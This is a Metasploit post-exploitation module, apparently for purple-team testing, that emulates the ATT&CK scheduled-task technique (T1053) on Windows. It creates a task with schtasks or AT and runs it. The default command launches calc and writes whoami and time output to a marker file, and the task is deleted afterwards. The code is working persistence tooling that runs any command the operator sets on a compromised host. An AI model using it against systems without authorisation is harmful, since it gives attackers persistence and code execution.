##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Accounts
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Scheduled Task (T1053) Windows - Purple Team',
                      'Description'   => %q{
                        Execution, Persistence, Privilege Escalation:
                        Utilities such as at and
                                             schtasks, along with the Windows Task Scheduler, can be used to schedule
                                             programs or scripts to be executed at a date and time. The account used to
                                             create the task must be in the Administrators group on the local system. A task
                                             can also be scheduled on a remote system, provided the proper authentication is
                                             met to use RPC and file and printer sharing is turned on. An adversary may use
                                             task scheduling to execute programs at system startup or on a scheduled basis
                                             for persistence, to conduct remote Execution as part of Lateral Movement, to
                                             gain SYSTEM privileges, or to run a process under the context of a specified
                                             account. },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'Platform'      => [ 'win' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1053' ] ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
        # TODO remote scheduling
        OptBool.new("CLEANUP", [true, "Remove scheduled task after execution", true]),
        OptString.new("METHOD", [true, "2=Schtasks.exe, 1=AT.exe, 0=Both. NOTE: AT.exe is deprecated and will likely fail.", "2"]),
        OptString.new("CMD",    [true, "Command to execute.", "cmd /c calc.exe && echo T1053 > C:\\t1053.txt && whoami >> C:\\t1053.txt && date /t >> C:\\t1053.txt && time /t >> C:\\t1053.txt"]),
        OptString.new("TASK_TIME", [false, "Task runtime (HH:MM).", "13:00"]),
        OptString.new("TASK_NAME", [false, "Task name.", "Praetorian"]),
        OptString.new("TASK_INT", [false, "Task interval (ONCE, DAILY, ONLOGON, etc.)", "ONCE"])
    ])
  end


  def run
  #
  # Schedule a task to run a command provided by the operator using either AT or SCHTASKS.
  #
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"

      case datastore['METHOD']
      when '0'
        t1053w_at()
        t1053w_schtasks()
      when '1'
        t1053w_at()
      when '2'
        t1053w_schtasks()
      else
        raise 'Invalid method option provided.'
      end

      # cleanup handled in individual functions

      print_good("Module T1053W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1053 execution failed.")
    end
  end


  def t1053w_at()
  #
  # Use AT (deprecated) to run a command.
  # This will probably fail as AT is no longer supported. If it does we just warn.
  #
    print_status("Scheduling task using AT.exe...")

    kill_calc

    cmd = "at #{datastore['TASK_TIME']} /interactive \"#{datastore['CMD']}\""
    output = run_cmd(cmd, true)
    if not output.nil? and not output.empty?
      if output =~ /not supported/i
        print_warning("AT.exe scheduling failed.")
        print_warning("The AT.exe program is deprecated and may be disabled on this system.")
      end
    end
  end


  def t1053w_schtasks()
  #
  # Schedule a task using schtasks.
  #
    print_status("Scheduling task using schtasks...")

    kill_calc

    cmd = "schtasks /Create /SC once /TN #{datastore['TASK_NAME']} /TR \"#{datastore['CMD']}\" /ST #{datastore['TASK_TIME']} /f"
    run_cmd(cmd, true)

    # trigger persistence by running the task
    cmd = "schtasks.exe /Run /TN #{datastore['TASK_NAME']}"
    run_cmd(cmd)

    sleep(3)

    # check for the persistence file and running instance of calc
    check_for_calc
    if file_exist?("C:\\t1053.txt")
      print_good("Found persistence file!")
    else
      print_warning("Unable to locate persistence file. Execution may have failed. Verify manually on the test machine.")
    end

    # cleanup
    if datastore['CLEANUP']
      print_status("Cleaning up...")
      cmd = "cmd /c schtasks.exe /Delete /TN #{datastore['TASK_NAME']} /f"
      run_cmd(cmd)
      print_status("Killing calc process if it exists...")
      kill_calc(true)
    end
  end
end
